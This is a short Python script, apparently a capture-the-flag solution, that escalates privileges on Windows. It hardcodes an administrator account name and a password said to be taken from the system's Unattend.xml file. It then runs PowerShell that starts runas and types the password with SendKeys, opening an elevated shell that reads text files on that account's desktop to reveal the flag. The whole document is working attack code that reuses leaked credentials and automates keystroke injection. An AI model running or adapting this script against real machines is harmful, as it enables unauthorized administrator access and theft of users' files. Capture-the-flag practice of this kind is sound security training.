#!/usr/bin/env python3
import subprocess
import time

def main():
    # Credentials identified from your system's Unattend.xml configurations
    admin_user = "SuperAdministrator"
    admin_password = "U3VwM2VyU2VjcmV0UGFzczRBRG0xbg"

    print(f"[+] Targeting Account: {admin_user}")
    print(f"[+] Extracted Password: {admin_password}")
    print("[*] Launching native runas session with automated keystroke injection...")

    # This inline PowerShell snippet runs runas, waits for the password prompt, and types it in.
    ps_command = f"""
    $wshell = New-Object -ComObject Wscript.Shell;
    
    # Start the native runas process in a new window
    Start-Process cmd.exe -ArgumentList '/c runas /user:{admin_user} "cmd.exe /k powershell -NoExit -Command Get-Content C:\\Users\\{admin_user}\\Desktop\\*.txt"'
    
    # Wait a split second for the password window to become active
    Start-Sleep -Milliseconds 800;
    
    # Send the password keys followed by the Enter key (~ means Enter)
    $wshell.SendKeys('{admin_password}~');
    """
    
    try:
        # Execute the automation wrapper
        subprocess.run(["powershell", "-Command", ps_command])
        print("[+] Automation command submitted! Check your desktop or the newly opened window for the flag contents.")
    except Exception as e:
        print(f"[-] Automated wrapper failure: {e}")

if __name__ == '__main__':
    main()
